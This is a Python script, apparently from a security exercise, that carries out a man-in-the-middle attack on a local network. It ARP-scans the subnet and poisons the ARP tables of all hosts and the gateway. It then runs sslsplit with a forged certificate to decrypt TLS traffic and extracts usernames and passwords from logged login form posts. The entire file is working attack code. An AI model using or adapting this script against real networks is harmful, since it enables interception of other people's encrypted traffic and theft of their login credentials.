#!/usr/bin/env python3

import netifaces as ni
from math import log2
from scapy.all import ARP, Ether, srp, send
from subprocess import Popen, DEVNULL
import subprocess
import time
import threading
import os

arp_table = {}
hot_ip = None
gtw_ip = None
hot_mc = None

def arp_scan():
	global arp_table, hot_ip, gtw_ip, hot_mc	
	# gtw_ip = 192.168.0.1
	# itf_if = (Interface Info)
	#      {'addr': '192.168.0.141', 'netmask': '255.255.255.0', 'broadcast': '192.168.0.255'} 
	# hot_ip = 192.168.0.141  MY IP
	# msk_ln = 24
	
	broadcast_mac = Ether(dst='ff:ff:ff:ff:ff:ff')

	gateway = ni.gateways()[ni.AF_INET][0]
	gtw_ip = gateway[0]
	itf_if = ni.ifaddresses(gateway[1])[ni.AF_INET][0]
	hot_mc = ni.ifaddresses(gateway[1])[ni.AF_LINK][0]['addr']
	hot_ip = itf_if['addr']
	msk_ln = 32 - sum([int(log2(256 - int(i))) for i in itf_if['netmask'].split('.')])
	
	subnet = hot_ip + '/' + str(msk_ln)
	arp = ARP(pdst=subnet)
	
	packet = broadcast_mac / arp	
	result = srp(packet, timeout=2, verbose=False)[0]

	for i in result:
		arp_table[i[1].psrc] = { "ip": i[1].psrc, "mac": i[1].hwsrc }

	print("Available devices")
	print("-------------------------------------")
	print("IP Address       MAC Address         ")
	print("-------------------------------------")
	for i in arp_table:
		if i == gtw_ip or i == hot_ip: continue;
		print("%-15s %18s" % (i, arp_table[i]['mac']))
	
	print("-------------------------------------")
	return


def send_fake_arp():
	'''
	pdst: is where the ARP packet should go (target),
	psrc: is the IP to update in the target's arp table,
	hwsrc: is the MAC corresponding to psrc, to update in the target's arp table
	hwdst: destination hardware address
	'''
	rt_mac = arp_table[gtw_ip]['mac']

	for i in arp_table:	
		if i == gtw_ip or i == hot_ip: continue;
		arp_to_victim = ARP(op=2, pdst=i,      hwdst=arp_table[i]['mac'], psrc=gtw_ip, hwsrc=hot_mc)
		arp_to_router = ARP(op=2, pdst=gtw_ip, hwdst=rt_mac,              psrc=hot_ip, hwsrc=hot_mc)
		
		# Local demo use
		# if i != '192.168.0.163': continue;

		send(arp_to_victim, verbose=False)
		send(arp_to_router, verbose=False)

def ssl_split():
	Popen([
		'sslsplit', '-D', '-S', 'sslsplit-log', '-p', 'sslsplit.pid',
		'-k', 'server.key', '-c', 'server.crt', 'ssl', '0.0.0.0', '8888'
	], stdout=DEVNULL, stderr=DEVNULL)
	return	

def sniff_password():
	try:
		while True:
			fil_nam = []
			for fil_nam in os.listdir("./sslsplit-log"):
				if '.bak' in fil_nam: continue;
				# print(fil_nam)
				f = open( "./sslsplit-log/" + fil_nam, errors="replace")
				lines = f.readlines()
				find = 0
				for i in lines:
					if "logintoken" in i:
						lis = i.split('&')
						nam = lis[1].split('=')[1]
						pas = lis[2].split('=')[1]
						print("Username:", nam)
						print("Password:", pas, end = "\n\n")
						find = 1
				f.close()
				if find:
					os.rename("./sslsplit-log/" + fil_nam, "./sslsplit-log/" + fil_nam + '.bak')
			time.sleep(3)
			if not os.path.exists('sslsplit.pid'): return;
	except KeyboardInterrupt:
		return
	return

def main():
	arp_scan()
	send_fake_arp()
	
	ssl_split()
	trd = threading.Thread(target = sniff_password)
	trd.start()

	while True:
		try:
			send_fake_arp()
			time.sleep(5)
		except KeyboardInterrupt:
			if not os.path.exists('sslsplit.pid'): break;
			with open('sslsplit.pid') as f:
				pid = next(f).strip()
				Popen(['kill', pid])
			break	
	trd.join()
	return 


if __name__ == '__main__':
    main()
